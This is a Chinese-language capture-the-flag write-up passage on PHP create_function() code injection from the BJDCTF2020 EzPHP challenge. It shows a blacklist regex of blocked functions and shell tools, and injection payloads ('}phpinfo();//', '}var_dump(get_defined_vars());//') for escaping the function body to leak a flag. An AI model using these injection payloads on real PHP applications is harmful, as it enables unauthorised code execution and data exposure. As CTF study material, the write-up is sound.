## create_function()命令执行





```php
if(preg_match('/^[a-z0-9]*$/isD', $code) || 
preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
    die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
} else { 
    include "flag.php";
    $code('', $arg); 
}
```



这里的重点是：

第五点的：

```php
extract($_GET["flag"]);
```

`extract()函数`作用是：将数组值 赋值给数组名同名的变量

我们可以通过这里去产生 `$code`、`$arg` 变量



```php
include "flag.php";
$code('', $arg); 
```

`$code('', $arg); ` 这一句十分重要

由于括号中使用的是逗号，我们一般的命令执行应该使用不了，参数不能控制。

了解到一种新的方法：`create_function()代码注入`

> 从`PHP 7.2.0`开始，`create_function()`被废弃

文章：https://www.cnblogs.com/-chenxs/p/11459374.html

`create_function($arg1,$arg2)`会创造一个匿名函数，

函数的参数部分由 `$arg1`指定

函数体由 `$arg2` 指定

例如：

```php
<?php
create_function('$a,$b', 'return "ln($a) + ln($b) = " . log($a * $b);');
?>
```

会创建以下匿名参数：

```php
function lambda($a,$b){
	return "ln($a) + ln($b) = " . log($a * $b);
}
```

我们可以在 $arg2 进行改动，实现代码注入

如果`$arg2 = }phpinfo();//`   可以执行`phpinfo()`函数

原因：首先 `}` 将匿名函数的大括号`}`闭合了，然后 `//` 将后面的大括号`}`给注释掉了

所以，这之间就可以写相应的代码了



由于这里过滤了很多东西，但是恰好引入了 `flag.php`，其中一定存在相应的flag变量

所以我们可以使用 `get_defined_vars()`函数：返回所有已定义变量组成的数组

然后使用 `var_dump()`进行输出

这样就可以知道有关flag的变量名了

```php
arg=}var_dump(get_defined_vars());//
```



### 例题：

#### [BJDCTF2020]EzPHP

